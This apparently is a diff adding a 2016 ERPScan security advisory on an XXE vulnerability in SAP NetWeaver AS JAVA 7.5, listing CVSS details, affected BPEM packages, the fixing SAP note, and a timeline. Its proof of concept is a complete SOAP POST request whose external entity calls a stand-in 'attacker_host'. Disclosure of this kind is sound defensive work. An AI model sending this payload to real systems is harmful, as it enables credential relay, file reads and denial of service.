@@ -1,0 +1,117 @@
+Application:	SAP NetWeaver AS JAVA
+Versions Affected:	SAP NetWeaver AS JAVA 7.5
+Vendor URL:	SAP
+Bugs:	XXE
+Reported:	09.03.2016
+Vendor response:	10.03.2016
+Date of Public Advisory:	09.08.2016
+Reference:	SAP Security Note 2296909
+Author:	Vahagn Vardanyan (ERPScan)
+
+1. ADVISORY INFORMATION
+
+Title:  [ERPSCAN-16-034] SAP NetWeaver AS JAVA – XXE vulnerability in BC-BMT-BPM-DSK component
+Advisory ID:[ERPSCAN-16-034]
+Risk: high
+Advisory URL: https://erpscan.com/advisories/erpscan-16-034-sap-netweaver-java-xxe-vulnerability-bc-bmt-bpm-dsk-component/
+Date published: 11.11.2016
+Vendors contacted: SAP
+
+
+2. VULNERABILITY INFORMATION
+
+Class: XXE
+Impact: Denial of Service, Read File
+Remotely Exploitable: yes
+Locally Exploitable: no
+
+CVSS Information
+
+CVSS Base Score v3:    6.4 / 10
+CVSS Base Vector:
+AV : Attack Vector (Related exploit range) Network (N)
+AC : Attack Complexity (Required attack complexity) High (H)
+PR : Privileges Required (Level of privileges needed to exploit) Low (L)
+UI : User Interaction (Required user participation) None (N)
+S : Scope (Change in scope due to impact caused to components beyond the vulnerable component) Unchanged (U)
+C : Impact to Confidentiality Low (L)
+I : Impact to Integrity Low (L)
+A : Impact to Availability High (H)
+
+
+3. VULNERABILITY DESCRIPTION
+
+1) It is possible, that an attacker can perform a DoS attack (for example, an XML Entity expansion attack)
+
+2) An SMB Relay attack is a type of man-in-the-middle attack where an attacker asks a victim to authenticate to a machine controlled by the
+attacker, then relays the credentials to the target. The attacker forwards the authentication information both ways, giving him access.
+
+
+4. VULNERABLE PACKAGES
+
+BPEM PORTAL CONTENT 7.20
+BPEM PORTAL CONTENT 7.30
+BPEM PORTAL CONTENT 7.31
+BPEM PORTAL CONTENT 7.40
+BPEM PORTAL CONTENT 7.50
+
+
+5. SOLUTIONS AND WORKAROUNDS
+
+To correct this vulnerability, install SAP Security Note  2296909
+
+
+6. AUTHOR
+
+ Vahagn Vardanyan (ERPScan)
+
+
+7. TECHNICAL DESCRIPTION
+
+PoC
+
+
+POST /sap.com~tc~bpem~him~uwlconn~provider~web/bpemuwlconn HTTP/1.1
+
+Content-Type: text/xml
+
+User-Agent: ERPscan
+
+Host: SAP_IP:SAP_PORT
+
+Content-Length: 480
+
+Connection: Keep-Alive
+
+Cache-Control: no-cache
+
+Authorization: Basic ZXJwc2NhbjplcnBzY2Fu
+
+
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker_host">
+]><SOAP-ENV:Envelope
+xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
+xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"
+xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+xmlns:xsd="http://www.w3.org/2001/XMLSchema">
+
+   <SOAP-ENV:Body>
+
+       <m:isBPMSInUse xmlns:m="http://api.facade.bpem.sap.com/"/>
+
+   &xxe;</SOAP-ENV:Body>
+
+</SOAP-ENV:Envelope>
+
+
+8. REPORT TIMELINE
+
+Sent:  09.03.2016
+Reported: 10.03.2016
+Vendor response: 10.03.2016
+Date of Public Advisory: 09.08.2016
+
+
+9. REFERENCES
+
+https://erpscan.com/advisories/erpscan-16-034-sap-netweaver-java-xxe-vulnerability-bc-bmt-bpm-dsk-component/
